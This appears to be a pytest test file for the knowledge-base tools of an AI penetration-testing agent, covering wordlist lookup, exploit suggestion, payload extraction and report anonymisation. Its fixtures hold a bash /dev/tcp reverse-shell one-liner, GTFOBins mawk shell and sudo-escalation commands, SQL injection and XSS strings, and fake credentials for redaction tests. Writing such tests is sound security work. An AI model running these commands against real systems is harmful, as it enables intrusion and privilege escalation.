"""Tests for the KB-powered agent tools (tools/kb_tools.py) and phrase queries.

All offline: KB DBs are compiled into tmp_path from fixture tarballs; the
SecLists tarball fixture backs find_wordlist extraction.
"""

import io
import json
import tarfile

import pytest

from suijin.modules.knowledge.lib import kb as kbmod
from suijin.modules.knowledge.lib import kb_tools
from suijin.modules.knowledge.lib.kb import compile_kb


def _make_tar(files: dict[str, str]) -> bytes:
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tar:
        for name, content in files.items():
            data = content.encode()
            info = tarfile.TarInfo(name=name)
            info.size = len(data)
            tar.addfile(info, io.BytesIO(data))
    return buf.getvalue()


@pytest.fixture
def kb_env(tmp_path, monkeypatch):
    """Built KB with payloads + seclists + gtfobins fixtures, workspace in tmp."""
    db = tmp_path / "kb.sqlite3"
    cache = tmp_path / "cache"
    ws = tmp_path / "suijin_agent"
    ws.mkdir()
    monkeypatch.setattr(
        kbmod,
        "SOURCES",
        {
            "payloads": {"repo": "example/payloads", "patterns": ["*.md"]},
            "seclists": {"repo": "example/seclists", "patterns": ["*.txt"]},
            "gtfobins": {"repo": "GTFOBins/GTFOBins.github.io", "patterns": ["_gtfobins/*"], "resolve_aliases": True},
        },
    )
    cache.mkdir()
    (cache / "payloads.tar.gz").write_bytes(
        _make_tar(
            {
                "payloads-x/README.md": "# Payloads\n\nunion select adjacent payload here.",
                "payloads-x/reverse.md": (
                    "# Reverse shells\n\nBash one-liner:\n```bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n```\n"
                ),
            }
        )
    )
    (cache / "seclists.tar.gz").write_bytes(
        _make_tar(
            {
                "SecLists-x/Discovery/Web-Content/common.txt": "admin\nbackup\n\n",
                "SecLists-x/Passwords/common.txt": "password123\nletmein\n",
            }
        )
    )
    (cache / "gtfobins.tar.gz").write_bytes(
        _make_tar(
            {
                "gtfo-x/_gtfobins/awk": "---\nalias: mawk\n...\n",
                "gtfo-x/_gtfobins/mawk": "functions:\n  shell:\n    - code: mawk 'BEGIN {system(\"/bin/sh\")}'\n  sudo:\n    - code: sudo mawk 'BEGIN {system(\"/bin/sh\")}'",
            }
        )
    )
    compile_kb(db_path=db, cache_dir=cache, log=lambda *_: None)

    # Point kb_tools at the fixtures (module-level names, monkeypatchable).
    monkeypatch.setattr(kbmod, "DB_PATH", db)  # used by kb_status() inside kb_stats()
    monkeypatch.setattr(kb_tools, "DB_PATH", db)
    monkeypatch.setattr(kb_tools, "CACHE_DIR", cache)
    # v4.1: kb_tools resolves workspace access lazily via platform —
    # patch the single source, not a copy
    import suijin.modules.platform.lib.workspace as pws

    monkeypatch.setattr(pws, "WORKSPACE_DIR", ws)
    monkeypatch.setattr(
        pws,
        "resolve_workspace_path",
        lambda p: (ws / p).resolve(),
    )
    return {"db": db, "cache": cache, "ws": ws}


class TestFindWordlist:
    def test_disabled_without_kb(self, monkeypatch, tmp_path):
        import pathlib

        monkeypatch.setattr(kb_tools, "DB_PATH", pathlib.Path(tmp_path / "none.sqlite3"))
        out = kb_tools.find_wordlist("directory")
        assert "DISABLED" in out
        assert "suijin pull kb" in out

    def test_finds_and_extracts(self, kb_env):
        out = kb_tools.find_wordlist("common")
        assert "Passwords/common.txt" in out
        extracted = kb_env["ws"] / "outputs" / "wordlists" / "common.txt"
        assert extracted.exists()
        assert "password123" in extracted.read_text()
        assert "wordlists/common.txt" in out

    def test_no_match_mentions_seclists_pull(self, kb_env):
        out = kb_tools.find_wordlist("zzz-no-such-list")
        assert "No seclists wordlists match" in out


class TestKbStats:
    def test_built_inventory(self, kb_env):
        out = kb_tools.kb_stats()
        assert "Knowledge base:" in out
        assert "payloads" in out and "seclists" in out and "gtfobins" in out
        assert "source:<name>" in out

    def test_disabled(self, monkeypatch, tmp_path):
        import pathlib

        monkeypatch.setattr(kb_tools, "DB_PATH", pathlib.Path(tmp_path / "none.sqlite3"))
        assert "DISABLED" in kb_tools.kb_stats()


class TestSuggestExploit:
    def test_gtfobins_exact_binary_hit(self, kb_env):
        out = kb_tools.suggest_exploit("awk")
        assert "gtfobins" in out
        assert "_gtfobins/awk" in out
        assert "mawk" in out  # alias resolved to full content

    def test_service_with_hacktricks_miss_is_fine(self, kb_env):
        out = kb_tools.suggest_exploit("apache httpd", "2.4.49")
        assert "Offline suggestions" in out
        assert "search_cve" in out

    def test_requires_service(self):
        assert "Error" in kb_tools.suggest_exploit("")

    def test_disabled(self, monkeypatch, tmp_path):
        import pathlib

        monkeypatch.setattr(kb_tools, "DB_PATH", pathlib.Path(tmp_path / "none.sqlite3"))
        assert "DISABLED" in kb_tools.suggest_exploit("awk")


class TestExtractPayloads:
    def test_extracts_code_block(self, kb_env):
        out = kb_tools.extract_payloads("reverse shells")
        assert "payloads/" in out
        files = list((kb_env["ws"] / "outputs" / "payloads").glob("kb_*"))
        assert files, out
        content = files[0].read_text()
        assert "/dev/tcp" in content

    def test_no_code_blocks(self, kb_env):
        out = kb_tools.extract_payloads("zzz nothing matches this at all")
        assert out.startswith("No matching") or "no extractable code blocks" in out


class TestWordlistTool:
    def _write(self, ws, name, words):
        d = ws / "wordlists"
        d.mkdir(exist_ok=True)
        (d / name).write_text("\n".join(words) + "\n")

    def test_merge_dedupes(self, kb_env):
        ws = kb_env["ws"]
        self._write(ws, "a.txt", ["admin", "backup", "admin"])
        self._write(ws, "b.txt", ["backup", "root"])
        out = kb_tools.wordlist_tool("merge", ["wordlists/a.txt", "wordlists/b.txt"], out="wordlists/merged.txt")
        assert "3 words" in out  # admin, backup, root
        merged = (ws / "wordlists" / "merged.txt").read_text().split()
        assert set(merged) == {"admin", "backup", "root"}
        assert merged[0] == "admin"  # order preserved (first occurrence)

    def test_filter_length_window(self, kb_env):
        ws = kb_env["ws"]
        self._write(ws, "c.txt", ["a", "abcd", "abcdefgh"])
        out = kb_tools.wordlist_tool("filter", ["wordlists/c.txt"], out="wordlists/f.txt", min_len=3, max_len=5)
        assert "1 words" in out
        assert (ws / "wordlists" / "f.txt").read_text().strip() == "abcd"

    def test_bad_action(self):
        assert "Error" in kb_tools.wordlist_tool("destroy", ["x.txt"])

    def test_missing_files(self):
        assert "Error" in kb_tools.wordlist_tool("merge", [])


class TestMineFailures:
    def test_clusters_similar_failures(self, kb_env):
        db = kb_env["ws"] / "failure_db.json"
        db.write_text(
            json.dumps(
                [
                    {
                        "target": "10.0.0.5",
                        "technique": "sqli union",
                        "payload": "' union select 1",
                        "reason": "WAF blocked request 403",
                        "times_seen": 3,
                    },
                    {
                        "target": "10.0.0.5",
                        "technique": "sqli union",
                        "payload": "' union select 2",
                        "reason": "WAF blocked request 403 again",
                        "times_seen": 1,
                    },
                    {
                        "target": "10.0.0.9",
                        "technique": "xss reflected",
                        "payload": "<script>",
                        "reason": "output encoded",
                        "times_seen": 1,
                    },
                ]
            )
        )
        out = kb_tools.mine_failures()
        assert "sqli union" in out
        assert "AVOID" in out

    def test_empty_db(self, kb_env):
        assert "No failure history" in kb_tools.mine_failures()


class TestAnonymizeReport:
    def test_scrubs_identifiers(self, kb_env):
        reports = kb_env["ws"] / "reports"
        reports.mkdir()
        (reports / "eng.md").write_text(
            "# Report\n\nAttacker at 203.0.113.7 and 198.51.100.22 (localhost 127.0.0.1 kept).\n"
            "Contact: admin@victim-corp.example\n"
            "Authorization: Bearer abcdefghijklmnop1234567890\n"
            "Leaked key: sk-proj-abcdefgh1234567890\n"
            "JWT: eyJhbGciOi.eyJzdWIiOiIx.SflKxwRJSMeKKF2QT4f\n"
            "-----BEGIN RSA PRIVATE KEY-----\nMIIEow\n-----END RSA PRIVATE KEY-----\n"
            "Flag FLAG{keep_me} preserved.\n"
        )
        out = kb_tools.anonymize_report("reports/eng.md")
        assert "Anonymized" in out
        red = (reports / "anonymized" / "eng.md").read_text()
        assert "203.0.113.7" not in red and "198.51.100.22" not in red
        assert "admin@victim-corp.example" not in red
        assert "abcdefghijklmnop1234567890" not in red
        assert "sk-proj-abcdefgh" not in red
        assert "eyJhbGciOi" not in red
        assert "BEGIN RSA PRIVATE KEY" not in red
        # safe values preserved
        assert "127.0.0.1" in red
        assert "FLAG{keep_me}" in red

    def test_missing_file(self, kb_env):
        assert "Error" in kb_tools.anonymize_report("reports/nope.md")


class TestPhraseQueries:
    """Quoted spans in search_kb keywords become ordered FTS5 phrases."""

    def test_expr_phrases(self):
        from suijin.modules.tools.lib.intel import _fts_match_expr

        assert _fts_match_expr('sql "union select" bypass') == '"sql" "union select" "bypass"'
        assert _fts_match_expr('"union select"') == '"union select"'
        assert _fts_match_expr("union select") == '"union" "select"'  # old behavior intact

    def test_phrase_requires_adjacency(self, kb_env, monkeypatch):
        from suijin.modules.tools.lib import intel

        monkeypatch.setattr(intel, "DB_PATH", kb_env["db"])
        # adjacent words match the phrase
        assert "payloads" in intel.search_kb('"union select"')
        # reversed order should NOT match the phrase
        assert "No matching" in intel.search_kb('"select union"')
